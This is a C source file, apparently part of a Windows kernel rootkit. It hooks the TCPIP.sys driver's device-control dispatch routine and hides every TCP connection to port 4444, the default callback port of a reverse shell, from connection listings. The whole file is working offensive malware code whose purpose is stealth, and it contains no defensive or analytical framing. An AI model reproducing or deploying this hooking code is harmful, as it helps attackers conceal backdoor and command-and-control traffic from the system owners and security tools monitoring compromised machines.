#include "tcphook.h"

// Declare variables
PFILE_OBJECT PFILE_TCP = NULL;
PDEVICE_OBJECT PDEVICE_TCP = NULL;
PDRIVER_OBJECT PDRIVER_TCP = NULL;


// Install a hook in the TCPIP.sys driver
// Intended to mask our listener/outbound connections 
NTSTATUS TCPHook() {

	// TCPIP.sys unicode string identifier 
	UNICODE_STRING  usDeviceName = RTL_CONSTANT_STRING(L"\\Device\\Tcp");

	
	// Retrieve device pointer to TCPIP.sys
	NTSTATUS status = IoGetDeviceObjectPointer(&usDeviceName, FILE_READ_DATA, &PFILE_TCP, &PDEVICE_TCP);

	// Check to ensure retrieving the pointer was successful
	if (!NT_SUCCESS(status)) {
		return status;
	}

	// Once we have a device pointer, retrieve the driver object
	PDRIVER_TCP = PDEVICE_TCP->DriverObject;

	// Save a reference to the old IRP handler for later
	OldIrpMjDeviceControl = PDRIVER_TCP->MajorFunction[IRP_MJ_DEVICE_CONTROL];

	// Replace the IRP_MJ_DEVICE_CONTROL function pointer with our own
	if (OldIrpMjDeviceControl != NULL) {
		InterlockedExchange((PLONG)&PDRIVER_TCP->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG)IrpCallRootkit);
	}


	return STATUS_SUCCESS;
}


NTSTATUS HookCompletionRoutine(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp, _In_ PVOID Context) {

	PVOID OutputBuffer;
	ULONG NumOutputBuffers;
	PIO_COMPLETION_ROUTINE p_compRoutine;
	ULONG i;

	// Connection status values:
	// 0 = Invisible
	// 1 = CLOSED
	// 2 = LISTENING
	// 3 = SYN_SENT
	// 4 = SYN_RECEIVED
	// 5 = ESTABLISHED
	// 6 = FIN_WAIT_1
	// 7 = FIN_WAIT_2
	// 8 = CLOSE_WAIT
	// 9 = CLOSING
	// ...

	// Grab the results from the buffer
	OutputBuffer = Irp->UserBuffer;

	// Grab the old completion routine from the context pool
	p_compRoutine = ((PREQINFO)Context)->OldCompletion;


	// Depending on the Request type (which affects structure size) determine the number of output results
	switch (((PREQINFO)Context)->ReqType) {

		case 0x101: 
		{
			NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO101);

			// Loop over the output buffers, if any of the connections match our condition
			// set the status to 0 "Invisible" so it doesn't show up in results
			for (i = 0; i < NumOutputBuffers; i++)
			{
				// Hide all established outbound TCP connections calling back to 4444
				if (RtlUshortByteSwap(((PCONNINFO101)OutputBuffer)[i].dst_port) == 4444) {
					((PCONNINFO101)OutputBuffer)[i].status = 0;
				}
			}
			break;
		}
		case 0x102: 
		{
		
			NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO102);

			// Loop over the output buffers, if any of the connections match our condition
			// set the status to 0 "Invisible" so it doesn't show up in results
			for (i = 0; i < NumOutputBuffers; i++)
			{
				// Hide all established outbound TCP connections calling back to 4444
				if (RtlUshortByteSwap(((PCONNINFO102)OutputBuffer)[i].dst_port) == 4444) {
					((PCONNINFO102)OutputBuffer)[i].status = 0;
				}
			}
			break;
		}
		case 0x110: 
		{
		
			NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO110);

			// Loop over the output buffers, if any of the connections match our condition
			// set the status to 0 "Invisible" so it doesn't show up in results
			for (i = 0; i < NumOutputBuffers; i++)
			{
				// Hide all established outbound TCP connections calling back to 4444
				// Using RtlUshortByteSwap to byte swap to 16-bit (unsigned short) port address
				if (RtlUshortByteSwap(((PCONNINFO110)OutputBuffer)[i].dst_port) == 4444) {
					((PCONNINFO110)OutputBuffer)[i].status = 0;
				}
			}
			break;
		}
		default: 
		{
			// Passthrough
			break;
		}

	}

	// Free the context pool we created in TCPIRPHookHandler
	// which contained the old completion routine
	ExFreePool(Context);

	// If we're not the end of the chain call the old completion routine
	if ((Irp->StackCount > (ULONG)1) && (p_compRoutine != NULL)) {
		return (p_compRoutine)(DeviceObject, Irp, NULL);
	}
	else {
		return Irp->IoStatus.Status;
	}
}


NTSTATUS RemoveTCPHook(IN PDRIVER_OBJECT DriverObject) {

	UNREFERENCED_PARAMETER(DriverObject);

	
	// Replace our hook function with the old proper one
	if (OldIrpMjDeviceControl) {
		InterlockedExchange((PLONG)&PDRIVER_TCP->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG)OldIrpMjDeviceControl);
	}

	// Decrements the file object reference count, should be one and deleted
	if (PFILE_TCP != NULL) {
		ObDereferenceObject(PFILE_TCP);
	}
	PFILE_TCP = NULL;

	return STATUS_SUCCESS;
}